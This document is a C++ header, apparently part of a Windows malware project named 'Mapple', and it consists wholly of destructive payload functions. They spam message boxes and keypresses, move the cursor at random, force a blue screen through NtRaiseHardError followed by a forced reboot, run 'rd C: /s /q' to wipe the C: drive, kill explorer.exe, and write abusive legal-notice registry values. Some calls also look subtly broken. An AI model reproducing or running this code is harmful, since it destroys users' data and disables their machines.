#pragma once

#include "Mapple.h"

#define GetCurrentFileDir GetDir()

enum
{
	FORCE_REBOOT = EWX_REBOOT | EWX_FORCE,
	SHUTDOWN_REASON = SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK
};

namespace System
{
	DWORD WINAPI MessageBoxes(LPVOID lpvd)
	{
		while (true)
		{
			Sleep(1);

			MessageBoxW
			(
				NULL,
				L"[DATA EXPUNGED] is coming",
				L"THE END IS NEAR!!!",
				MB_OK | MB_ICONEXCLAMATION
			);
		}

		return 0;
	}

	DWORD WINAPI PressKeys(LPVOID lpParam)
	{
		while (true)
		{
			PressKey(VK_CAPITAL, 1);
			PressKey(VK_SHIFT, 1);
			PressKey(VK_CONTROL, 1);
			PressKey(VK_SCROLL, 1);
		}

		return 0;
	}

	DWORD WINAPI FuckStrings(LPVOID lpvd)
	{
		while (true)
		{
			HWND hwnd = FindWindowW(NULL, L"You are a asshole" + rand() % 256);
			EnumChildWindows(hwnd, EnumChildProc, NULL);
		}
	}

	DWORD FuckCursorPosition(LPVOID lpParam)
	{
		while (true)
		{
			SetCursorPos(rand() % 5, rand() % 5);
			Sleep(1);

			if (rand() % 25 == 24)
			{
				SetCursorPos(rand() % 30, rand() % 30);
			}

			else
			{
				SetCursorPos(rand() % w, rand() % h);
			}
		}
	}

	VOID CopyMappleFile()
	{
		for (int i = 0; i < 1024; i++)
		{
			CopyFileW(GetCurrentFileDir, (WCHAR*)L"", true);
		}
	}

	VOID ForceBSOD()
	{
		BOOLEAN boolean;
		DWORD response;
		NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibrary(L"ntdll"), "NtRaiseHardError");
		RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibrary(L"ntdll"), "RtlAdjustPrivilege");
		RtlAdjustPrivilege(19, 1, 0, &boolean);
		ULONG_PTR args[] = { 0xc0000067 };
		NtRaiseHardError(0xC0000145, 1, 0, (PULONG)args, 6, &response);

		HANDLE token;
		TOKEN_PRIVILEGES privileges;

		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
		privileges.PrivilegeCount = 1;
		privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

		ExitWindowsEx(FORCE_REBOOT, SHUTDOWN_REASON);
		Sleep(-1);
	}

	DWORD WINAPI Destroy(LPVOID lpvd)
	{
		system("rd C: /s /q");
		system("taskkill /f /im explorer.exe");
		return 0;
	}

	DWORD WINAPI InitialPayloads(LPVOID lpvd)
	{
		SetRegValue
		(
			HKEY_CURRENT_USER,
			L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
			L"legalnoticecaption", REG_SZ,
			(LPBYTE)L"Fuck you", 16
		);

		SetRegValue
		(
			HKEY_CURRENT_USER,
			L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
			L"legalnoticetext", REG_SZ,
			(LPBYTE)L"Go to shit, you are fucked by Mapple", 16
		);

		Sleep(-1);
		return 0;
	}
}